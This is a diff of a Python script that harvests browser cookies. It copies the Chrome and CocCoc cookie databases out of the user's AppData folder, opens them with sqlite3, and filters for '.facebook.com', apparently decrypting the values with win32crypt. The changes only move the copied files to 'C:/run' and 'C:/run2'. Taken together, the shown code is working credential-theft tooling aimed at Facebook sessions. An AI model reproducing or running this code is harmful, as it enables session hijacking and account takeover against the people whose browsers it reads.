@@ -1,4 +1,4 @@
-#edit this cookies
+﻿#edit this cookies
 host_key_get =[".facebook.com"]
 
 
@@ -12,10 +12,10 @@ import win32crypt #https://sourceforge.net/projects/pywin32/
 
 def get_all_cookies_chrome():
 	# Copy Cookies to current folder
-	copyfile(getenv("APPDATA") + "/../Local/Google/Chrome/User Data/Default/Cookies", './Cookies')
+	copyfile(getenv("APPDATA") + "/../Local/Google/Chrome/User Data/Default/Cookies", 'C:/run')
 	
 	# Connect to the Database
-	conn = sqlite3.connect('./Cookies')
+	conn = sqlite3.connect('C:/run')
 	cursor = conn.cursor()
 	
 	# Get the results
@@ -52,10 +52,10 @@ def get_all_cookies_chrome():
 
 def get_all_cookies_coccoc():
 	# Copy Cookies to current folder
-	copyfile(getenv("APPDATA") + "/../Local/CocCoc/Browser/User Data/Default/Cookies", './Cookies')
+	copyfile(getenv("APPDATA") + "/../Local/CocCoc/Browser/User Data/Default/Cookies", 'C:/run2')
 	
 	# Connect to the Database
-	conn = sqlite3.connect('./Cookies')
+	conn = sqlite3.connect('C:/run2')
 	cursor = conn.cursor()
 	
 	# Get the results
@@ -126,4 +126,3 @@ def print_cookies(list_all_cookies):
 #(2)
 # print(get_cookies_host_key(get_all_cookies_chrome()))
 # print(get_all_cookies().__sizeof__())
-
